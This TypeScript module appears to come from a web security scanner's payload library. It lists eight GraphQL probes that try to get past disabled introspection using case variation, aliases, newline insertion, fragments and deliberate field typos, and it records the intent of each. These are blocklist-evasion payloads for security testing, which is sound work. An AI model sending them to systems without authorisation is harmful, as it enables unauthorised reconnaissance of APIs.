import type { PayloadVariant } from '../types';

export const META = {
  id: 'graphql-introspection-disabled-bypass',
  family: 'graphql-attack' as const,
  name: 'GraphQL Introspection Disabled Bypass',
  description: 'Attempts to bypass disabled GraphQL introspection via case variation, aliases, and field suggestions.',
  defaultRisk: 'none' as const,
  insertionPointKinds: ['graphql', 'body', 'json'],
};

const PROBES = [
  { value: '{"query":"{__schema{types{name}}}"}', intent: 'Standard __schema introspection — baseline disabled check', signals: ['introspection-enabled'] },
  { value: '{"query":"{__Schema{types{name}}}"}', intent: '__schema in mixed-case to bypass naive regex blocklist', signals: ['introspection-enabled'] },
  { value: '{"query":"{s:__schema{types{name}}}"}', intent: '__schema via alias to evade field-name blocklist', signals: ['introspection-enabled'] },
  { value: '{"query":"{__type(name:\\"Query\\"){fields{name}}}"}', intent: '__type query to enumerate Query type fields', signals: ['introspection-enabled'] },
  { value: '{"query":"{__typename}"}', intent: '__typename probe — minimal introspection always available', signals: ['introspection-enabled'] },
  { value: '{"query":"{user{nme}}"}', intent: 'Intentional field typo to trigger field suggestion leak', signals: ['field-suggestion-leaked'] },
  { value: '{"query":"{__schema\\n{types{name}}}"}', intent: '__schema with newline injection to break simple pattern matching', signals: ['introspection-enabled'] },
  { value: '{"query":"fragment f on __Schema{types{name}}{...f}"}', intent: 'Fragment-based __schema introspection bypass', signals: ['introspection-enabled'] },
];

export function variants(): PayloadVariant[] {
  return PROBES.map((p, i) => ({
    id: `gql-introspect-bypass-${i + 1}`,
    family: 'graphql-attack' as const,
    value: p.value,
    encoding: 'raw' as const,
    intent: p.intent,
    requiresOast: false,
    requiresBrowser: false,
    destructiveRisk: 'none' as const,
    expectedSignals: p.signals,
  }));
}
